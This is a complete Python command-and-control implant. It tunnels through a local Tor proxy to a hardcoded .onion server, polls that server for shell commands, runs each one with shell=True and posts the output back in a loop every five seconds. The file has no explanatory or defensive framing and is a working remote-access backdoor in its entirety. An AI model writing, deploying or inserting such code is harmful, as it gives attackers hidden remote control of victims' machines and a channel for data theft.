#!/usr/bin/env python3
import socket
import struct
import json
import subprocess
import time

TOR_SOCKS_HOST = "127.0.0.1"
TOR_SOCKS_PORT = 9050
SERVER_HOST = "uwo2bqudxjq74mpd2guc2hsjbqughbx475hrqnmgbqwxn7eqavt6ouqd.onion"
SERVER_PORT = 9051
BUFFER_SIZE = 8192

# ------------------ SOCKS5 CONNECT ------------------
def socks5_connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TOR_SOCKS_HOST, TOR_SOCKS_PORT))
    s.sendall(b'\x05\x01\x00')
    resp = s.recv(2)
    if resp != b'\x05\x00':
        raise Exception("SOCKS5 handshake failed")
    host_bytes = host.encode()
    req = b'\x05\x01\x00\x03' + bytes([len(host_bytes)]) + host_bytes + struct.pack(">H", port)
    s.sendall(req)
    resp = s.recv(10)
    if resp[1] != 0x00:
        raise Exception(f"SOCKS5 connection failed with code {resp[1]}")
    return s

# ------------------ HTTP REQUEST ------------------
def http_request(method, path="/", body=None, headers=None):
    s = socks5_connect(SERVER_HOST, SERVER_PORT)
    if headers is None:
        headers = {}

    req = f"{method} {path} HTTP/1.1\r\nHost: {SERVER_HOST}\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    if body:
        req = req.encode() + body
    else:
        req = req.encode()

    s.sendall(req)

    resp = b""
    while True:
        chunk = s.recv(BUFFER_SIZE)
        if not chunk:
            break
        resp += chunk
    s.close()

    # Remove headers
    body = resp.split(b"\r\n\r\n", 1)[-1]
    return body

# ------------------ MAIN LOOP ------------------
def main():
    while True:
        # Fetch command
        resp = http_request("GET")
        data = json.loads(resp.decode())
        cmd = data.get("command", "").strip()
        if cmd:
            # Execute locally
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            except subprocess.CalledProcessError as e:
                output = e.output.decode()
            print(f"[+] Executed: {cmd}")

            # Send output back
            payload = json.dumps({"command": cmd, "output": output}).encode()
            http_request("POST", body=payload, headers={"Content-Type": "application/json"})
        time.sleep(5)

if __name__ == "__main__":
    main()

